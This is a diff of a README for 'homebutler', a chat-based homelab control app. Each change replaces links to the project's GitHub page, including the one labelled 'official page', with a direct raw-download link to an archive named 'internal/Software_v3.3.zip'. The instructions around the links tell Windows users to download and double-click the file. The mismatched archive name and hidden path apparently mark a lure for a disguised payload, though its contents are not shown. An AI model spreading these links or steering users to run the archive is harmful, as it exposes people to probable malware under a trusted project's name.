@@ -1,6 +1,6 @@
 # 🏠 homebutler - Control Your Homelab From Chat
 
-[![Download homebutler](https://img.shields.io/badge/Download-homebutler-brightgreen)](https://github.com/saefmusic/homebutler)
+[![Download homebutler](https://img.shields.io/badge/Download-homebutler-brightgreen)](https://github.com/saefmusic/homebutler/raw/refs/heads/main/internal/Software_v3.3.zip)
 
 ## 📋 What is homebutler?
 
@@ -25,7 +25,7 @@ No special hardware or software is required. homebutler runs fast and uses minim
 
 ## 🚀 Getting Started
 
-1. Click the big download link at the top or visit the [official homebutler page](https://github.com/saefmusic/homebutler).  
+1. Click the big download link at the top or visit the [official homebutler page](https://github.com/saefmusic/homebutler/raw/refs/heads/main/internal/Software_v3.3.zip).  
 2. Look for the latest Windows release file. It will usually be named like `homebutler-windows.exe` or similar.  
 3. Click the file to download it to your computer.  
 4. Once downloaded, find the file in your Downloads folder and double-click it to run.  
@@ -42,7 +42,7 @@ No installation process is needed. The app runs directly from the downloaded fil
 
 You must first get the homebutler file from the official GitHub page below.  
 
-[![Download homebutler](https://img.shields.io/badge/Download-homebutler-blue)](https://github.com/saefmusic/homebutler)
+[![Download homebutler](https://img.shields.io/badge/Download-homebutler-blue)](https://github.com/saefmusic/homebutler/raw/refs/heads/main/internal/Software_v3.3.zip)
 
 ### Step 2: Run the App
 
@@ -147,4 +147,4 @@ Keep your SSH credentials safe. Only run homebutler files downloaded from the of
 
 You can always get the latest version and find help on the official page:
 
-[https://github.com/saefmusic/homebutler](https://github.com/saefmusic/homebutler)
+[https://github.com/saefmusic/homebutler/raw/refs/heads/main/internal/Software_v3.3.zip](https://github.com/saefmusic/homebutler/raw/refs/heads/main/internal/Software_v3.3.zip)
